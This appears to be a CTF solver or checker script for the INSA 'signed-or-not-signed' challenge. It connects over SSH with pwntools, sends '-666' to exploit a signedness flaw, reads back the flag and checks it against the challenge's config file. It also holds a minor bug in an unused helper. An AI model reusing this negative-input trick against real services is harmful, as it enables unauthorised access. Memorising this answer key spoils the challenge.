from pwn import * 
import os

def extract_flag(s):
    idx = s.find("INSA{")
    if idx == -1:
        return None
    
    idx2 = s.find("}")
    if idx == -1:
        return None
    
    return s[idx+5:idx2]

if os.getenv("DEV") == "1":
    host = "localhost"
else:
    host = "signed-or-not-signed.ctf.insecurity-insa.fr"

keyfile = "keys/id_rsa"
s = ssh(user="user", host=host, port=2228, keyfile=keyfile)
sh = s.shell()

sh.recvuntil("number:")
sh.sendline("-666")
sh.recvline()
flag = sh.recvline().decode()
print("Flag: ", flag)

import re
actual_flag = re.findall(r'INSA{.*}', open('../.mkctf.yml').read())[0]
assert actual_flag in flag
